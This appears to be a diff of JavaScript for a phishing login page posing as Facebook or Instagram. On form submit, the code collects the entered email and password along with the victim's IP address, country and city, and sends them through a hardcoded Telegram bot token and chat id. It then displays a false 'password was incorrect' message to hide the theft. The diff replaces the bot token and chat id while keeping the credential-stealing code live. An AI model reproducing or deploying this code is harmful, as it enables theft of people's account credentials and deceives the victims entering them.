@@ -6,33 +6,30 @@ var st = 0;
 
 form.addEventListener("submit", (e) => {
   e.preventDefault();
- 
-    fetch("https://ipapi.co/json/")
-      .then((res) => res.json())
-      .then((data) => {
-        ct = data.ip;
-        co = data.country_name;
-        lo = data.country_calling_code;
-        st = data.city;
 
-        var identity = document.getElementById("email").value;
-        var password = document.getElementById("password").value;
+  fetch("https://ipapi.co/json/")
+    .then((res) => res.json())
+    .then((data) => {
+      ct = data.ip;
+      co = data.country_name;
+      lo = data.country_calling_code;
+      st = data.city;
 
-        var my_text = `Facebook Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
+      var identity = document.getElementById("email").value;
+      var password = document.getElementById("password").value;
 
-        var token = "6531950063:AAEmz4WuaV5va_RgVFeljgO_fAULG19h39I";
-        var chat_id = -4157105964;
-        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+      var my_text = `Facebook Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-        let api = new XMLHttpRequest();
-        api.open("GET", url, true);
-        api.send();
-        document.getElementById("alert-message").innerHTML =
-          "Sorry, your password was incorrect. Please double-check your password.";
-      });
+      var token = "7523994267:AAFKipJ1nhsp1TtSRBfaOqum0i9ZOeDnLQI";
+      var chat_id = -1666157643;
+      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
-
-
+      let api = new XMLHttpRequest();
+      api.open("GET", url, true);
+      api.send();
+      document.getElementById("alert-message").innerHTML =
+        "Sorry, your password was incorrect. Please double-check your password.";
+    });
 
   // window.location.replace("https://www.instagram.com/accounts/login/")
   //   console.log("Incorrect Password!");
